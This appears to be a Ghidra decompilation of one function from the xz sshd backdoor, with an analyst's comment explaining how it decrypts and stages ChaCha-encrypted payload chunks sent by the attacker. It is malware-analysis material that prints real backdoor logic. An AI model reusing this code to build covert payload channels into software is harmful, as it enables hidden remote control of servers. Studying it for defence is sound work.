// /home/kali/xzre-ghidra/xzregh/108D50_decrypt_payload_message.c
// Function: decrypt_payload_message @ 0x108D50
// Calling convention: unknown
// Prototype: undefined decrypt_payload_message(void)


/*
 * AutoDoc: Decrypts a ChaCha-wrapped `key_payload_t` chunk, copies the plaintext body into the global
 * staging buffer when the advertised length fits, and bumps `ctx->current_data_size`. The body
 * is decrypted twice—the second pass keeps the keystream in sync with sshd's original consumer—
 * so later packets can continue appending without tearing, and any failure forces the payload
 * state back to 0xffffffff.
 */
#include "xzre_types.h"


undefined8 decrypt_payload_message(undefined4 *param_1,ulong param_2,long param_3)

{
  undefined4 *puVar1;
  long lVar2;
  int iVar3;
  ulong uVar4;
  long lVar5;
  ulong uVar6;
  undefined1 *puVar7;
  int iVar8;
  undefined4 output;
  undefined4 uStack_7d;
  undefined4 uStack_79;
  undefined4 uStack_75;
  undefined8 header_size;
  undefined8 uStack_69;
  undefined1 body_length [49];
  
  header_size = 0;
  uStack_69 = 0;
  puVar7 = body_length;
  for (lVar5 = 0x29; lVar5 != 0; lVar5 = lVar5 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  if (param_1 == (undefined4 *)0x0) {
    if (param_3 == 0) {
      return 0;
    }
  }
  else {
    if (param_3 == 0) {
      return 0;
    }
    if (*(uint *)(param_3 + 0x104) == 3) {
      return 1;
    }
    if ((0x12 < param_2) && (*(uint *)(param_3 + 0x104) < 2)) {
      output = *param_1;
      uStack_7d = param_1[1];
      uStack_79 = param_1[2];
      uStack_75 = param_1[3];
      iVar3 = secret_data_get_decrypted(&header_size,param_3);
      if (iVar3 != 0) {
        puVar1 = param_1 + 4;
        iVar8 = (int)param_2 + -0x10;
        iVar3 = chacha_decrypt(puVar1,iVar8,&header_size,&output,puVar1,*(undefined8 *)(param_3 + 8)
                              );
        if (((iVar3 != 0) && (uVar6 = (ulong)*(ushort *)(param_1 + 4), uVar6 <= param_2 - 0x12)) &&
           (lVar5 = *(long *)(param_3 + 0xe8), uVar6 < (ulong)(*(long *)(param_3 + 0xe0) - lVar5)))
        {
          lVar2 = *(long *)(param_3 + 0xf0);
          for (uVar4 = 0; uVar6 != uVar4; uVar4 = uVar4 + 1) {
            *(undefined1 *)(lVar5 + lVar2 + uVar4) = *(undefined1 *)((long)param_1 + uVar4 + 0x12);
          }
          *(long *)(param_3 + 0xe8) = *(long *)(param_3 + 0xe8) + uVar6;
          iVar3 = chacha_decrypt(puVar1,iVar8,&header_size,&output,puVar1,
                                 *(undefined8 *)(param_3 + 8));
          if (iVar3 != 0) {
            return 1;
          }
        }
      }
    }
  }
  *(undefined4 *)(param_3 + 0x104) = 0xffffffff;
  return 0;
}

